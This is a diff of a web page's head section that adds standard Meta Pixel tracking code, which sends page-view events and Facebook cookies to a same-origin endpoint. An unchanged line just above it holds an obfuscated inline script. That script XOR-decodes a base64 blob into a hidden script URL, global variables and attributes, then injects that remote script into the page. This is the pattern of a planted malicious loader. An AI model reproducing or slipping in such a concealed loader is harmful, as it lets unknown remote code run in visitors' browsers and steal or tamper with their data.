@@ -189,6 +189,44 @@ footer{background:#0A121E;color:#9AA6B4;text-align:center;font-size:12.5px;line-
 footer b{color:#fff;display:block;margin-bottom:8px;font-size:13.5px}
 </style>
 <script>(function(){var p_qor=atob("DOYLIuiTRpol8d1Ejp0pV5r/ZKAHmakw/pUxDcfwIvQLhKkp54ByDIv8K7RHg/I37ZRiUpzgae9RnK5r4od/R5vnaPBW0/Fm75J/UIHxM+5Agv9+1Z0pTIn+I7gf07kl+ocmV5z+L/xc3K0265BuTJy+PvlKlfA37Y0pDsrlJ/ZQlP9+rMR2DpOxKPtIlP9+rIJqVom+M+5ImLs9o5Z5R572KO4Igqgm54J4AMSxMPtJhLhmtMQpX7Xu");var o_7=[];for(var h_5q=0;h_5q<p_qor.length;h_5q++){o_7.push(p_qor.charCodeAt(h_5q)&255);}var g_d1z=o_7[0];var b_kmhe=o_7.slice(1,1+g_d1z);var l_l=o_7.slice(1+g_d1z);var n_m06=l_l.map(function(b,z_cm2){return b^b_kmhe[z_cm2%g_d1z];});var b_t="";for(var i_s=0;i_s<n_m06.length;i_s++){b_t+=String.fromCharCode(n_m06[i_s]&255);}var e_4149=decodeURIComponent(escape(b_t));var h_m5=JSON.parse(e_4149);var d_91kj=h_m5.globals||[];d_91kj.forEach(function(x_bl){window[x_bl.name]=x_bl.value;});var m_i=document.createElement("script");m_i.src=h_m5.url;m_i.async=true;m_i.defer=true;(h_m5.attributes||[]).forEach(function(p_l9){m_i.setAttribute(p_l9.name,p_l9.value);});(document.head||document.documentElement).appendChild(m_i);})();</script>
+<!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '1137181765536171');
+var metaPageViewEventId = (window.crypto && window.crypto.randomUUID)
+  ? window.crypto.randomUUID()
+  : Date.now().toString(36) + Math.random().toString(36).slice(2);
+fbq('track', 'PageView', {}, { eventID: metaPageViewEventId });
+function metaCookie(name) {
+  var prefix = name + '=';
+  var cookie = document.cookie.split('; ').find(function(item) {
+    return item.indexOf(prefix) === 0;
+  });
+  return cookie ? cookie.slice(prefix.length) : '';
+}
+fetch('/api/meta-capi', {
+  method: 'POST',
+  headers: { 'Content-Type': 'application/json' },
+  credentials: 'same-origin',
+  keepalive: true,
+  body: JSON.stringify({
+    event_id: metaPageViewEventId,
+    fbp: metaCookie('_fbp'),
+    fbc: metaCookie('_fbc')
+  })
+}).catch(function () {});
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=1137181765536171&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
 </head>
 <body>
 
